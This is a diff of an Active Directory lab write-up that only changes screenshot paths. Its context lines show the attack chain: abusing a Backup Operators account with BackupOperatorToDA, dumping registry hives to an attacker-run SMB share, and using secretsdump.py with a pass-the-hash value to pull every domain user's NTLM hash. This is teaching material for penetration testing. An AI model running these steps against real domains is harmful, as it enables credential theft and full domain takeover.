@@ -41,7 +41,7 @@ In my attack we will use the tool BackupOperatorToDA from [mpgn](https://github.
 
 * List files on the Domain Controller:
 
-![](<../../../.gitbook/assets/image (17).png>)
+![](<../../../.gitbook/assets/image (17) (1).png>)
 
 * Copy files from the Domain Controller:
 
@@ -62,7 +62,7 @@ From our enumeration when we gained access to the `sa_backup` account we know th
 python3 /opt/impacket/examples/smbserver.py share ~/adlab -smb2support
 ```
 
-![](<../../../.gitbook/assets/image (71) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1).png>)
 
 4\. The next step is to execute the BackupOperatorToDa.exe tool to retrieve the the SAM, SYSTEN and SECURITY HIVE and save them in our created public share:
 
@@ -78,7 +78,7 @@ If you are using another share, make sure the share is writeable by anyone other
 
 5\. If we check in our directory `~/adlab` we can see the files: (for the screenshot I made a copy in the HIVE directory)
 
-![](<../../../.gitbook/assets/image (73).png>)
+![](<../../../.gitbook/assets/image (73) (1).png>)
 
 6\. The next step is to run SecretDump.py to retrieve the machine account NTLM hash out of these HIVE dumps:
 
@@ -94,7 +94,7 @@ secretsdump.py LOCAL -system ~/adlab/SYSTEM -security ~/adlab/SECURITY -sam ~/ad
 secretsdump.py 'secure.local/dc03$'@dc03.secure.local -hashes aad3b435b51404eeaad3b435b51404ee:ba6414d4e6ce546465b256950282c7f3
 ```
 
-![](<../../../.gitbook/assets/image (18).png>)
+![](<../../../.gitbook/assets/image (18) (1).png>)
 
 We retrieved the NTLM account hash of every user in the domain and could authenticate with these to the domain controller. As Administrator for example which is Domain Admin.
 
